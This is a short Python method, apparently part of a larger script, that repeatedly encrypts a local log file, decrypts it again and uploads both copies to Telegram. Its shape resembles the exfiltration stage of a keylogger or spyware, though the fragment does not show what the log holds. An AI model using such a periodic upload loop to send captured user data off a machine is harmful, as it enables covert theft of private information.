def upload_file_periodically(self) -> None:
    sleep(INTERVAL)

    while True:
        try:
            if exists(FILENAME):
                print("Log file found. Starting encryption...")  # Debug: Print log file found
                self.encrypt_file(FILENAME)
                if exists(self.encrypted_filename):  # Check if the encrypted file exists
                    print("Encrypted file found. Starting decryption...")  # Debug: Print encrypted file found
                    # Decrypt the file after encryption
                    self.decrypt_file(self.encrypted_filename, DECRYPTED_FILENAME)

                    # Upload the decrypted file to Telegram
                    self.upload_file_to_telegram(DECRYPTED_FILENAME)

                    # Upload the encrypted file to Telegram
                    self.upload_file_to_telegram(self.encrypted_filename)
                else:
                    alarm(f'Encrypted file not found: {self.encrypted_filename}')
            else:
                alarm(f'Log file not found: {FILENAME}')

            sleep(INTERVAL)

        except Exception as e:
            alarm(f'Error Occurred: {e}')